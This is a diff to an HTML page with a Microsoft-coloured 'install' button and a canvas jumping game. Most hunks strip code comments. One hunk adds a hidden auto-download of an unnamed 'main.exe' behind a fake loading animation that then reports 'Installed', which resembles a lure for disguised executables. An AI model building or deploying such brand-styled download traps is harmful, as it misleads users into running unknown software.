@@ -143,7 +143,7 @@
   .falling-logo div:nth-child(3) { background: #00A4EF; }
   .falling-logo div:nth-child(4) { background: #FFB900; }
 
-  /* Full screen game canvas (eliminates any clipping) */
+  /* Full screen game canvas */
   #gameCanvas {
     position: fixed;
     top: 0;
@@ -186,13 +186,23 @@
     function install() {
       const btn = document.getElementById('installBtn');
       if (btn.classList.contains('loading') || btn.classList.contains('done')) return;
+      
       btn.classList.add('loading');
+
+      // Trigger download of main.exe from your repository
       setTimeout(() => {
+        const link = document.createElement('a');
+        link.href = 'main.exe'; // Looks for main.exe in the same repository path
+        link.download = 'main.exe';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
         btn.classList.remove('loading');
         btn.classList.add('done');
         btn.querySelector('.label').textContent = 'Installed';
         btn.querySelector('.label').style.display = 'inline';
-      }, 1400);
+      }, 1200);
     }
 
     let triggered = false;
@@ -307,7 +317,6 @@
         const roll = Math.random();
 
         if (roll < 0.28) {
-          // 1. Spikes on ground (1 to 3 spikes)
           const count = 1 + Math.floor(Math.random() * 3);
           const spikeW = 20 + Math.random() * 4;
           const spikeH = 26 + Math.random() * 6;
@@ -322,7 +331,6 @@
           cursorX += count * (spikeW + 2);
         } 
         else if (roll < 0.55) {
-          // 2. Platform / Block
           const blockW = 45 + Math.floor(Math.random() * 4) * 25;
           const blockH = 34 + Math.floor(Math.random() * 3) * 16;
           const blockY = groundY - blockH;
@@ -358,7 +366,6 @@
           cursorX += blockW;
         } 
         else if (roll < 0.78) {
-          // 3. Mid-Air Jump Orb over spike pit
           const pitCount = 2 + Math.floor(Math.random() * 2);
           const pitWidth = pitCount * 24;
           for (let i = 0; i < pitCount; i++) {
@@ -381,7 +388,6 @@
           cursorX += pitWidth + 25;
         } 
         else {
-          // 4. Trampoline launcher (soars high into the open sky)
           const padW = 36, padH = 10;
           obstacles.push({
             type: 'pad',
@@ -565,17 +571,14 @@
           let landedOnBlock = false;
           let hitTrampolineThisFrame = false;
 
-          // Spawning
           nextSpawnX -= speed;
           if (nextSpawnX <= W) {
             nextSpawnX = spawnProceduralChunk(W + 40);
           }
 
-          // Process Obstacles
           obstacles.forEach(obs => {
             obs.x -= speed;
 
-            // 1. Spikes Collision
             if (obs.type === 'spike') {
               if (
                 landX + cubeSize - 6 > obs.x &&
@@ -585,8 +588,6 @@
                 die();
               }
             }
-
-            // 2. Block Collision
             else if (obs.type === 'block') {
               const inXRange = (landX + cubeSize - 6 > obs.x) && (landX + 6 < obs.x + obs.w);
 
@@ -611,8 +612,6 @@
                 die();
               }
             }
-
-            // 3. Trampoline Collision
             else if (obs.type === 'pad') {
               if (obs.bounce > 0) obs.bounce--;
 
@@ -620,7 +619,7 @@
               const padOverlapY = (cube.y + cubeSize >= obs.y - 6) && (cube.y + cubeSize <= obs.y + obs.h + 12);
 
               if (padOverlapX && padOverlapY) {
-                cube.vy = -16.2; // High jump into open air
+                cube.vy = -16.2;
                 cube.y = obs.y - cubeSize - 2;
                 cube.jumping = true;
                 cube.onGround = false;
@@ -632,7 +631,6 @@
             }
           });
 
-          // Ground landing
           if (!landedOnBlock && !hitTrampolineThisFrame) {
             if (cube.y >= groundY - cubeSize) {
               cube.y = groundY - cubeSize;
@@ -656,7 +654,6 @@
           }
         }
 
-        // Particles
         particles.forEach(p => {
           p.x += p.vx;
           p.y += p.vy;
@@ -666,18 +663,15 @@
         });
         particles = particles.filter(p => p.alpha > 0);
 
-        // Ring Pulses
         ringPulses.forEach(r => {
           r.r += 3.2;
           r.alpha -= 0.04;
         });
         ringPulses = ringPulses.filter(r => r.alpha > 0);
 
-        // Canvas Render
         ctx.clearRect(0, 0, W, H);
         ctx.save();
 
-        // Screen Shake
         if (shakeTime > 0) {
           const sX = (Math.random() - 0.5) * shakeTime * 0.8;
           const sY = (Math.random() - 0.5) * shakeTime * 0.8;
@@ -685,7 +679,6 @@
           shakeTime--;
         }
 
-        // Ground Line
         ctx.strokeStyle = '#B3B0AD';
         ctx.lineWidth = 2;
         ctx.beginPath();
@@ -693,7 +686,6 @@
         ctx.lineTo(W, groundY);
         ctx.stroke();
 
-        // Road hash lines
         ctx.strokeStyle = '#D2D0CE';
         ctx.lineWidth = 1.5;
         for (let x = -((worldOffset) % 24); x < W; x += 24) {
@@ -703,9 +695,7 @@
           ctx.stroke();
         }
 
-        // Draw Obstacles
         obstacles.forEach(obs => {
-          // 1. Spikes
           if (obs.type === 'spike') {
             ctx.fillStyle = '#323130';
             ctx.beginPath();
@@ -715,7 +705,6 @@
             ctx.closePath();
             ctx.fill();
           }
-          // 2. Blocks
           else if (obs.type === 'block') {
             ctx.fillStyle = '#ffffff';
             ctx.fillRect(obs.x, obs.y, obs.w, obs.h);
@@ -725,7 +714,6 @@
             ctx.strokeStyle = '#D2D0CE';
             ctx.strokeRect(obs.x + 4, obs.y + 4, obs.w - 8, obs.h - 8);
           }
-          // 3. Jump Orb
           else if (obs.type === 'orb') {
             ctx.save();
             const pulse = Math.sin(frame * 0.15) * 3;
@@ -749,7 +737,6 @@
             ctx.fill();
             ctx.restore();
           }
-          // 4. Trampoline
           else if (obs.type === 'pad') {
             ctx.save();
             const compress = obs.bounce ? Math.sin(obs.bounce * 0.5) * 3 : 0;
@@ -778,7 +765,6 @@
           }
         });
 
-        // Shockwaves
         ringPulses.forEach(r => {
           ctx.strokeStyle = `rgba(255, 185, 0, ${r.alpha})`;
           ctx.lineWidth = 3;
@@ -787,7 +773,6 @@
           ctx.stroke();
         });
 
-        // Player Cube
         if (!gameOver) {
           ctx.save();
           ctx.translate(landX + cubeSize / 2, cube.y + cubeSize / 2);
@@ -801,7 +786,6 @@
           ctx.restore();
         }
 
-        // Death Particles
         particles.forEach(p => {
           ctx.save();
           ctx.translate(p.x, p.y);
